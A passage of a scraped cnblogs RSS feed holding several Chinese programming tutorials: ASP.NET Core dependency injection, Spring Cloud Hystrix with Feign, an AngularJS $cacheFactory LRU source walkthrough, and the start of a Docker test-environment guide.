        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; OperationController(IOperationTransient operationTransient,
            IOperationScoped operationScoped,
            IOperationSingleton operationSingleton,
            IOperationInstance operationInstance,
            OperationServices operationServices)
        {
            OperationTransient &lt;/span&gt;=&lt;span&gt; operationTransient;
            OperationScoped &lt;/span&gt;=&lt;span&gt; operationScoped;
            OperationSingleton &lt;/span&gt;=&lt;span&gt; operationSingleton;
            OperationInstance &lt;/span&gt;=&lt;span&gt; operationInstance;
            _operationServices &lt;/span&gt;=&lt;span&gt; operationServices;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET: Operation&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ActionResult Index()
        {
            ViewBag.OperationTransient &lt;/span&gt;=&lt;span&gt; OperationTransient;
            ViewBag.OperationScoped &lt;/span&gt;=&lt;span&gt; OperationScoped;
            ViewBag.OperationSingleton &lt;/span&gt;=&lt;span&gt; OperationSingleton;
            ViewBag.OperationInstance &lt;/span&gt;=&lt;span&gt; OperationInstance;
            ViewBag._operationServices &lt;/span&gt;=&lt;span&gt; _operationServices;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; View();
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　6.Index显示&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@{
    ViewData[&quot;Title&quot;] = &quot;Index&quot;;
}

&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Controller Operations&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationTransient: @ViewBag.OperationTransient.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationScoped: @ViewBag.OperationScoped.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationSingleton: @ViewBag.OperationSingleton.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationInstance: @ViewBag.OperationInstance.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Services Operations&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationTransient: @ViewBag._operationServices.OperationTransient.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationScoped: @ViewBag._operationServices.OperationScoped.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationSingleton: @ViewBag._operationServices.OperationSingleton.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationInstance: @ViewBag._operationServices.OperationInstance.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　7.运行结果&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/984232/201905/984232-20190520215438252-395341455.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　可以看到，单例生命周期服务每一次请求的标识一样。作用域生命周期的服务，在一次请求中使用的同一个实例，第二次请求创建新的实例。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;5.请求服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　来自HttpContext的一次ASP.NET 请求中，可用的服务是通过&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.http.httpcontext.requestservices?view=aspnetcore-2.2&quot; target=&quot;_blank&quot;&gt;RequestServices&lt;/a&gt;集合公开的。&lt;/p&gt;
&lt;p&gt;　　请求服务将你配置的服务和请求描述为应用程序的一部分。在子的对象指定依赖之后，这些满足要求的对象可通过查找RequestServices中对应的类型得到，而不是ApplicationServices。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;6.设计依赖注入服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在自定义的服务中，避免使用静态方法和直接实例化依赖的类型，而是通过依赖注入请求它。（New is Glue）&lt;/p&gt;
&lt;p&gt;　　如果类有太多的依赖关系被注入时，通常表明你的类试图做的太多（违反了单一职责原则），需要转移一些职责。&lt;/p&gt;
&lt;p&gt;　　同样，Controller类应该重点关注UI，因此业务逻辑和数据访问等细节应该在其他类中。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;7.使用Autofac容器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;a href=&quot;https://autofaccn.readthedocs.io/zh/latest/&quot; target=&quot;_blank&quot;&gt;Autofac&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 22 May 2019 13:09:00 +0000</pubDate>
<dc:creator>卡西莫多_Ruby</dc:creator>
<og:description>ASP.NET Core的底层设计支持和使用依赖注入。ASP.NET Core 应用程序可以利用内置的框架服务将服务注入到启动类的方法中，并且应用程序服务也可以配置注入。由ASP.NET Core 提</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/afei-24/p/10885044.html</dc:identifier>
</item>
<item>
<title>一起来学Spring Cloud | 第五章：熔断器 ( Hystrix) - young码农</title>
<link>http://www.cnblogs.com/haly/p/10905469.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haly/p/10905469.html</guid>
<description>&lt;p&gt;1. 隔离（线程池隔离和信号量隔离）：限制调用分布式服务的资源使用，某一个调用的服务出现问题不会影响其他服务调用。&lt;/p&gt;
&lt;p&gt;2. 降级：超时降级、资源不足时(线程或信号量)降级，降级后可以配合降级接口返回托底数据。&lt;/p&gt;
&lt;p&gt;3. 熔断：当失败率达到阀值自动触发降级(如因网络故障/超时造成的失败率高)，熔断器触发的快速失败会进行快速恢复。&lt;/p&gt;
&lt;p&gt;4. 缓存：提供了请求缓存、请求合并实现。&lt;/p&gt;
&lt;p&gt;如果想要了解更多的Hystrix的底层及实现原理，可以参考相关文章学习，本系列主要讲解如何快速在工作中使用Hystrix。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、环境准备：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最终目录结构：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1663312/201905/1663312-20190522204627582-2019768610.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;本系列文章，都是层层递进的，本章内容在前面搭建好的项目框架上进行开发讲解，对搭建springcloud的多模块子项目框架不清楚的同学可以参考 &lt;span&gt;：&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;a id=&quot;homepage1_HomePageDays_DaysList_ctl00_DayList_TitleUrl_0&quot; href=&quot;https://www.cnblogs.com/haly/p/10863055.html&quot;&gt;一起来学Spring Cloud | 第一章 ：如何搭建一个多模块的springcloud项目&lt;/a&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;工作中，我们基本上都是使用feign进行服务调用的，&lt;strong&gt;所以本章只讲解Feign中使用断路器&lt;/strong&gt;，对上一章feign工程搭建有兴趣的可以参考：&lt;a id=&quot;homepage1_HomePageDays_DaysList_ctl01_DayList_TitleUrl_0&quot; href=&quot;https://www.cnblogs.com/haly/p/10857752.html&quot;&gt;一起来学Spring Cloud | 第四章：服务消费者 ( Feign )&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、Feign中使用断路器：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1. 在上章的springcloud-feign-client工程的application.properties配置文件中，加入配置：feign.hystrix.enabled=true&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
server.port=9600
spring.application.name=springcloud-feign-client
eureka.client.serviceUrl.defaultZone=http://localhost:8761/eureka/
&lt;span&gt;feign.hystrix.enabled=true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;2. 在上章的springcloud-feign-client工程中，新增一个FeignRemoteService类的实现类，命名为：HystrixFeignRemoteCallBack，做为出现接口异常时的回调方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;37&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.haly.romote.hystrix;

import org.springframework.stereotype.Component;

import com.haly.romote.FeignRemoteService;

@Component
public class HystrixFeignRemoteCallBack implements FeignRemoteService{

        @Override
        public String hello(String name) {
                // TODO Auto-generated method stub
                return name + &quot;,Due error,enter Hystrix&quot;;
        }

}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3. 在上章的springcloud-feign-client工程中，新增一个FeignRemoteService类中加入回调实现类的注解配置&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;37&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.haly.romote;

import org.springframework.cloud.openfeign.FeignClient;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import com.haly.romote.hystrix.HystrixFeignRemoteCallBack;

@FeignClient(value = &quot;springcloud-eureka-client&quot;,&lt;span&gt;fallback = HystrixFeignRemoteCallBack.class&lt;/span&gt;)
public interface FeignRemoteService {

    @RequestMapping(value = &quot;/hello&quot;,method = RequestMethod.GET)
    public String hello(@RequestParam(value = &quot;name&quot;) String name);
    
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4. 运行项目&lt;/p&gt;
&lt;p&gt;① 先启动springcloud-eureka-server模块，开启eureka注册中心&lt;/p&gt;
&lt;p&gt;② 启动springcloud-eureka-client模块，开启提供远程服务功能，并且提供接口能力 /hello&lt;/p&gt;
&lt;p&gt;③ 启动springcloud-feign-client模块，开启消费模块，用来调用springcloud-eureka-client模块中的/hello接口&lt;/p&gt;
&lt;p&gt;Eureka上的注册信息，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1663312/201905/1663312-20190522195506575-1720343263.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器，输入网址：http://localhost:9600/getHello?name=young码农，运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1663312/201905/1663312-20190522195601924-1725271285.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们模仿生产环境，服务提供者宕机（或者返回超时）&lt;/strong&gt;，这里我们手动停掉springcloud-eureka-client服务&lt;/p&gt;
&lt;p&gt;输入网址：http://localhost:9600/getHello?name=young码农&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1663312/201905/1663312-20190522195003607-731118376.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;本章我们只是在回调接口中，返回一个字符串，工作中，有些场景会做一些业务逻辑处理（比如调用短信发送接口，出现异常会在记录一条异常日志，后面来处理这些异常）。&lt;/p&gt;
&lt;p&gt;工作中我们会遇到很多特殊场景，特别在访问量过大，业务较复杂的时候，会出现一些奇奇怪怪的问题，所以Feign,Hystrix有许多配置项可以使用，我们可以根据相应业务配进行合理配置&lt;/p&gt;



</description>
<pubDate>Wed, 22 May 2019 12:54:00 +0000</pubDate>
<dc:creator>young码农</dc:creator>
<og:description>在微服务项目中，一个系统可以分割成很多个不同的服务模块，不同模块之间我们通常需要进行相互调用。springcloud中可以使用RestTemplate+Ribbon和Feign来调用（工作中基本都是使</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/haly/p/10905469.html</dc:identifier>
</item>
<item>
<title>angular源码剖析之Provider系列--CacheFactoryProvider - john23.net</title>
<link>http://www.cnblogs.com/johnwonder/p/10908325.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/johnwonder/p/10908325.html</guid>
<description>&lt;h2 id=&quot;cachefactoryprovider-简介&quot;&gt;CacheFactoryProvider 简介&lt;/h2&gt;
&lt;p&gt;源码里是这么描述的：&lt;br/&gt;Factory that constructs {@link $cacheFactory.Cache Cache} objects and gives access to&lt;br/&gt;them.&lt;br/&gt;意思就是通过cacheFactory可以构造一个Cache对象来给予访问和执行权限。&lt;/p&gt;
&lt;p&gt;这个Cache对象&lt;a href=&quot;https://code.angularjs.org/1.5.8/docs/api/ng/type/$cacheFactory.Cache&quot;&gt;官方文档&lt;/a&gt;是这么说的：&lt;br/&gt;A cache object used to store and retrieve data, primarily used by $http and the script directive to cache templates and other data.&lt;br/&gt;用我自己的话来说就是 提供存储和访问缓存对象的服务,angular内部主要被$http,script指令用于&lt;br/&gt;缓存template和其他数据。我们自己可以在Controller内部使用。&lt;/p&gt;
&lt;h2 id=&quot;cachefactoryprovider-用法&quot;&gt;CacheFactoryProvider 用法&lt;/h2&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;!doctype html&amp;gt;
  &amp;lt;html lang=&quot;en&quot; ng-app=&quot;myapp&quot;&amp;gt;
   &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;Generator&quot; content=&quot;EditPlus®&quot;&amp;gt;
    &amp;lt;meta name=&quot;Author&quot; content=&quot;&quot;&amp;gt;
    &amp;lt;meta name=&quot;Keywords&quot; content=&quot;&quot;&amp;gt;
    &amp;lt;meta name=&quot;Description&quot; content=&quot;&quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
    &amp;lt;script src=&quot;js/angular.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
   &amp;lt;/head&amp;gt;
   &amp;lt;body&amp;gt;
    &amp;lt;div ng-controller=&quot;MyController&quot;&amp;gt;
    &amp;lt;/div&amp;gt;
     &amp;lt;script &amp;gt;
       var app=angular.module('myapp',[]);
       app.controller('MyController',function($scope,$cacheFactory){
         var myCache = $cacheFactory(&quot;myCache&quot;,{capacity: 6});
         //var myCache1 = $cacheFactory(&quot;myCache&quot;,{capacity: 6}); //会报错
         myCache.put(&quot;name&quot;,&quot;john&quot;);
         myCache.put(&quot;name1&quot;,&quot;wonder&quot;);
         myCache.put(&quot;name&quot;,&quot;john&quot;);
      });

       app.controller('getCacheController',['$scope','$cacheFactory',
          function($scope,$cacheFactory){  
                var cache = $cacheFactory.get('myCache');  
                var name = cache.get('name');  
                console.log(name);  //打印john
            }]);  
     &amp;lt;/script&amp;gt;
   &amp;lt;/body&amp;gt;
  &amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看了上面这个一个简单的例子，读者可能会产生如下疑惑：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;不是名为CacheFactoryProvider吗，怎么在代码里只看到cacheFactory呢？&lt;/li&gt;
&lt;li&gt;cacheFactory是怎么存储对象的？&lt;br/&gt;下面我们来依次解答这两个问题&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;cachefactory的注入&quot;&gt;$cacheFactory的注入&lt;/h2&gt;
&lt;p&gt;我们首先来看第一个问题，这个问题要牵涉到angular里面的依赖注入机制，我们前面的分析也讲过，&lt;br/&gt;angular会在启动之前通过调用&lt;code&gt;publishExternalAPI&lt;/code&gt; 函数先发布一些扩展API,同时定义ng&lt;br/&gt;模块，在定义ng模块的时候就传入了注入provider的方法&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;angularModule('ng', ['ngLocale'], ['$provide',
     //通过参数注入$provide
     function ngModule($provide) {
          ///部分代码省略
         $provide.provider({
           $cacheFactory: $CacheFactoryProvider,
         });
    }])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;$cacheFactory出现了，它是通过javascript的键值对象作为键传给provider方法。那么它是如何存储&lt;br/&gt;对象的呢？首先我们看它的定义：&lt;/p&gt;
&lt;h2 id=&quot;cachefactoryprovider的定义&quot;&gt;CacheFactoryProvider的定义&lt;/h2&gt;
&lt;p&gt;内部定义了依赖注入核心的&lt;code&gt;$get&lt;/code&gt;方法,&lt;code&gt;$get&lt;/code&gt;方法返回cacheFactory方法(也就是上面实例代码里的&lt;br/&gt;&lt;code&gt;$cacheFactory&lt;/code&gt;参数)。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;  function $CacheFactoryProvider() {
    //定义$get方法供依赖调用
    //controller中获取cacheFactory时会调用此方法
    //这个$get方法也是获取provider的关键方法
     this.$get = function() {
       var caches = {};//闭包的一个运用

       function cacheFactory(cacheId, options) {
         //部分代码省略
         //可以用if来判断
         if (cacheId in caches) {//如果caches中已经存在cacheId
             //实例代码里抛出的错误就在此处、
             //统一调用minErr函数
            throw minErr('$cacheFactory')('iid', &quot;CacheId '{0}' is already taken!&quot;
                                          , cacheId);
          }

           var size = 0,
           //把options 和{id:cacheId} 放入{} 中 不是深拷贝
           stats = extend({}, options, {id: cacheId}),
           data = createMap(),//通过Object.create(null) 创建个空对象
           capacity = (options &amp;amp;&amp;amp; options.capacity) || Number.MAX_VALUE,
           lruHash = createMap(),
           freshEnd = null,
           staleEnd = null;
           //返回caches中的一个对象
           return caches[cacheId] = {
                //省略部分代码
                //存储里讲解
                put:function(key,value){
                },
                get: function(key) {
                },
                remove: function(key) {
                },
                removeAll: function() {
                },
                destroy: function() {
                },
                info: function() {
                }
           }
           //刷新节点次序
           function refresh(entry) {
           }
           //
           function link(nextEntry, prevEntry) {

           }
         }

         //所有的缓存
        cacheFactory.info = function() {
          var info = {};
          forEach(caches, function(cache, cacheId) {
            info[cacheId] = cache.info();
          });
          return info;
        };

        cacheFactory.get = function(cacheId) {
            return caches[cacheId];
        };

        return cacheFactory;
     }
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;cachefactoryprovider的存储&quot;&gt;CacheFactoryProvider的存储&lt;/h2&gt;
&lt;p&gt;存储分为这几个核心方法:&lt;code&gt;put&lt;/code&gt;,&lt;code&gt;refresh&lt;/code&gt;,&lt;code&gt;remove&lt;/code&gt;,&lt;code&gt;link&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;put函数&quot;&gt;put函数&lt;/h3&gt;
&lt;p&gt;value会放入data对象中，key会放入lruHash链表&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;      put: function(key, value) {
         if (isUndefined(value)) return;
           //如果设定的capcity小于maxvalue
         if (capacity &amp;lt; Number.MAX_VALUE) {
           //lruHash 存了当前的key 还有可能是 p 和n  (previous和next)
           var lruEntry = lruHash[key] || (lruHash[key] = {key: key});
           //刷新各节点的次序
           refresh(lruEntry);//把当前entry放入链表末尾
         }
         //如果key 在data里不存在 那么增加size
         if (!(key in data)) size++;
         data[key] = value;
         //当大于capacity时 会清除最早加入的那个
         if (size &amp;gt; capacity) {
           this.remove(staleEnd.key);//移除淘汰节点stableEnd
         }
         return value;
     }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;get函数&quot;&gt;get函数&lt;/h3&gt;
&lt;p&gt;Retrieves named data stored in the {@link $cacheFactory.Cache Cache} object&lt;br/&gt;获取存储在cache对象中的指定数据&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;        get: function(key) {
          if (capacity &amp;lt; Number.MAX_VALUE) {
            var lruEntry = lruHash[key];
            if (!lruEntry) return;
            // 获取first的时候 因为staleEnd为first 所以会让staleEnd指向 second
            // 内部会执行link 使得 second.p = null
            // first.p =  third  third.n = first
            //stableEnd为 second freshEnd为first
            refresh(lruEntry);
          }
          return data[key];
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;remove函数&quot;&gt;remove函数&lt;/h3&gt;
&lt;p&gt;Removes an entry from the {@link $cacheFactory.Cache Cache} object.&lt;br/&gt;从cache对象删除一个entry&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;remove: function(key) {
          //如果capacity小于maxvalue
          if (capacity &amp;lt; Number.MAX_VALUE) {
            //先取出当前key的entry
            var lruEntry = lruHash[key];
            if (!lruEntry) return;
            //第一次超过时 freshEnd 为third  lryEntry为first
            if (lruEntry == freshEnd) freshEnd = lruEntry.p;
             //第一次超过时 staleEnd 为first  lryEntry为first
             //所以 会让 stalEnd 指向second 以便于下次移除时
            if (lruEntry == staleEnd) staleEnd = lruEntry.n;
            //把淘汰节点的一个节点选中
            //第一次超过时 lryEntry.n为 second  lryEntry.p 为null
            //执行结果为 second.p = null
            link(lruEntry.n,lruEntry.p);
            //把当前key从lruHash中删除
            delete lruHash[key];
          }
          if (!(key in data)) return;
          delete data[key];
          size--;
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;refresh函数&quot;&gt;refresh函数&lt;/h3&gt;
&lt;p&gt;makes the &lt;code&gt;entry&lt;/code&gt; the freshEnd of the LRU linked list。&lt;br/&gt;把entry 放入链表的末尾&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;    function refresh(entry) {
      if (entry != freshEnd) {
        if (!staleEnd) { //staleEnd为空那么就让他指向当前entry
          staleEnd = entry;
        } else if (staleEnd == entry) {
          //如果淘汰节点等于当前节点
          staleEnd = entry.n; //用于把 当前的下一个节点 用作淘汰节点
        }
        //放入第一个元素时 entry.n,entry.p都为undefined
        link(entry.n, entry.p); //当前的上一个节点 和当前的下一个节点
        link(entry, freshEnd); // 当前的节点 和 最新的末尾节点
        freshEnd = entry;  
        freshEnd.n = null;
        //第一次执行完 结果为: freshEnd = first  staleEnd为first  
        //first.p=null first.n=null
        //第二次执行完 结果为：freshEnd = second staleEnd为first
        // first.p=null first.n= second
        // scecond.p = first scecond.n = null
        //第三次执行完 freshEnd = third staleEnd为first first.p=null
        //first.n= second
        // second.p = first second.n = null
        // third.p = second third.n = null
      }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;link函数&quot;&gt;link函数&lt;/h3&gt;
&lt;p&gt;bidirectionally(双向链表) links two entries of the LRU linked list&lt;br/&gt;双向链接链表里的两个元素。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;function link(nextEntry, prevEntry) {
      //undefined 不等于undefined
      if (nextEntry != prevEntry) {
        //
        if (nextEntry) nextEntry.p = prevEntry;
        //p stands for previous, 'prev' didn't minify
        if (prevEntry) prevEntry.n = nextEntry;
         //n stands for next, 'next' didn't minify
      }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/64521/201905/64521-20190522205523732-1452343471.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;欢迎关注我的公众号，获取最新源码解析文章！&lt;/p&gt;
&lt;h6 id=&quot;参考资料&quot;&gt;参考资料：&lt;/h6&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/bopo/p/9255654.html&quot;&gt;【算法】—— LRU算法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://flychao88.iteye.com/blog/1977653&quot;&gt;缓存淘汰算法--LRU算法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/L-rTC-qlnvKxbwUI1FmeHw&quot;&gt;漫画：什么是LRU算法？&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Wed, 22 May 2019 12:28:00 +0000</pubDate>
<dc:creator>john23.net</dc:creator>
<og:description>CacheFactoryProvider 简介 源码里是这么描述的： Factory that constructs {@link $cacheFactory.Cache Cache} objects</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/johnwonder/p/10908325.html</dc:identifier>
</item>
<item>
<title>一文教您如何通过 Docker 快速搭建各种测试环境(Mysql, Redis, Elasticsearch, MongoDB) | 建议收藏 - 犬小哈</title>
<link>http://www.cnblogs.com/quanxiaoha/p/10908003.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/quanxiaoha/p/10908003.html</guid>
<description>&lt;blockquote readability=&quot;7.8415841584158&quot;&gt;
&lt;p&gt;欢迎关注个人微信公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 文末&lt;strong&gt;分享阿里 P8 高级架构师吐血总结的 《Java 核心知识整理&amp;amp;面试.pdf》资源链接&lt;/strong&gt;！！&lt;/p&gt;
&lt;p&gt;个人网站: &lt;a href=&quot;https://www.exception.site&quot; class=&quot;uri&quot;&gt;https://www.exception.site&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155843825424368&quot; title=&quot;一文教您如何通过 Docker 快速搭建各种测试环境(Mysql, Redis, Elasticsearch, MongoDB)&quot; alt=&quot;一文教您如何通过 Docker 快速搭建各种测试环境(Mysql, Redis, Elasticsearch, MongoDB)&quot;/&gt;&lt;/p&gt;
&lt;p&gt;小哈今天给大家分享的主题是，如何通过 Docker 快速搭建各种测试环境，本文列举的，也是小哈在工作中经常用到的，其中包括 Mysql, Redis, Elasticsearch, MongoDB 安装步骤, 通过几行命令秒秒钟就能轻松搞定。&lt;/p&gt;
&lt;p&gt;友情提示：搭建之前，你需要先安装 Docker 哟，本文基于您已经安装好 Docker 的基础上！&lt;/p&gt;
&lt;p&gt;废话少说，正文开始！&lt;/p&gt;
&lt;h2 id=&quot;目录&quot;&gt;目录&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;一、镜像加速&lt;/li&gt;
&lt;li&gt;二、快速安装&amp;amp;搭建 Mysql 环境&lt;/li&gt;
&lt;li&gt;三、快速安装&amp;amp;搭建 Redis 环境&lt;/li&gt;
&lt;li&gt;四、快速安装&amp;amp;搭建 MongDB 环境&lt;/li&gt;
&lt;li&gt;五、快速安装&amp;amp;搭建 Elasticsearch 环境&lt;/li&gt;
&lt;li&gt;六、总结&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;一镜像加速&quot;&gt;一、镜像加速&lt;/h2&gt;
&lt;p&gt;Docker 默认是从官方镜像地址 Docker Hub 下下载镜像，由于服务器在国外的缘故，导致经常下载速度非常慢。为了提升镜像的下载速度，我们可以手动配置国内镜像加速器，让下载速度飚起来。&lt;/p&gt;
&lt;p&gt;国内的镜像加速器选项较多，如：阿里云，DaoCloud 等。&lt;/p&gt;
